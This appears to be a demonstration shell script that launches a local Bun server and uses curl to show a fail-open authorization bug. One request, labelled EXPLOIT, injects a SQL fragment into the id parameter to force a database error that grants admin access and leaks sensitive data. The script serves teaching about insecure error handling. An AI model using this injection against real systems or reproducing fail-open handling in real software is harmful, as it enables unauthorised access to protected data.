#!/bin/bash

echo "Starting Fail-Open Demo server..."
bun index_fail_open.ts &
SERVER_PID=$!
sleep 2

echo -e "
1. Attempting access as Alice (ID=1) - Expected result: 403 Forbidden"
curl -s -i "http://localhost:3001/admin/dashboard?id=1" | grep -E "HTTP/|error"

echo -e "
2. Attempting access as Bob (ID=2) - Expected result: 200 OK (He's an admin)"
curl -s -i "http://localhost:3001/admin/dashboard?id=2" | grep -E "HTTP/|message"

echo -e "
3. EXPLOIT: Triggering a database error to force a fail-open:"
# This query will fail because of 'non_existent_table', triggering the error handler.
# The server's console will show "!!! FAIL-OPEN: Error occurred !!!"
curl -s -i "http://localhost:3001/admin/dashboard?id=1%20OR%20(SELECT%201%20FROM%20non_existent_table)" | grep -E "HTTP/|message|sensitive_data"

echo -e "
Stopping server..."
kill $SERVER_PID
